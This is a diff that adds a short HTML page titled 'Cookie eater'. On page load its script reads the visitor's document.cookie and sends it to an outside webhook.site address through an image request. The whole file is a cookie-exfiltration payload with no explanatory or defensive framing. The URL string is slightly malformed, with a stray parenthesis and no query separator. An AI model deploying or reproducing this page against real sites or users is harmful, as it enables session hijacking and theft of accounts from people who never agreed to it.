@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie eater</title>
+</head>
+<body>
+    <h1>Welcome!</h1>
+    <p>If you see this message, cookies are being sent...</p>
+
+    <script>
+        // Function to send cookies to the specified URL
+        function sendCookies() {
+            var cookies = document.cookie;
+            var img = new Image();
+            img.src = "(https://webhook.site/9c6a373b-cb85-497d-a289-dd35bb13ceb4" + encodeURIComponent(cookies);
+        }
+
+        // Execute the function after the page loads
+        window.onload = function() {
+            sendCookies();
+        };
+    </script>
+</body>
+</html>
